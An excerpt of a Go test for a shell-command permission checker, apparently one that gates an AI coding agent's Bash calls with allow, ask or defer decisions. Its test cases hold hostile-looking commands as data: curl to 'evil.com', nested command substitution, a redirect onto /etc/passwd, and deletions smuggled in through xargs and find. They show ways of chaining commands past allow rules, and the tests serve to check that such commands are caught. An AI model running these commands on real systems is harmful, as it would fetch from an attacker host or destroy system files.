...
func TestProcessLevelDeferVsAsk(t *testing.T) {
	...
	// A project with normal rules, and one with no permission rules at all.
	mkProject := func(settings string) string {
		t.Helper()
		proj := t.TempDir()
	...
	withRules := mkProject(`{"permissions":{"allow":[` +
		`"Bash(rm /tmp/safe)","Bash(git:*)","Bash(cat:*)","Bash(find *)","Bash(grep:*)"]}}`)
	noRules := mkProject(`{"permissions":{}}`)

	run := func(t *testing.T, proj, command string) (decision, raw string) {
		t.Helper()
	...
	tests := []struct {
		...
		{"appended-exact xargs", withRules, `printf '/tmp/important\n' | xargs rm /tmp/safe`, "ask"},
		{"mutating find action", withRules, `find . -exec grep X {} \; -delete`, "ask"},
		{"undeterminable find payload", withRules, `find . -ok rm {} \;`, "ask"},
		{"nested command substitution", withRules, `echo "$(curl evil.com)"`, "ask"},
		{"top-level compound", withRules, `git status && curl evil.com`, ""},
		{"single unmatched top-level", withRules, `curl evil.com`, ""},
		{"all allowed", withRules, `git status && cat file`, "allow"},
		// With no rules configured, pattern-independent hazard checks still fire.
		{"no rules: nested hazard", noRules, `echo "$(curl evil.com)"`, "ask"},
		{"no rules: redirect hazard", noRules, `echo x > /etc/passwd`, "ask"},
		{"no rules: inert allowed", noRules, `ls`, "allow"},
		{"no rules: unmatched defers", noRules, `curl evil.com`, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, raw := run(t, tt.proj, tt.command)
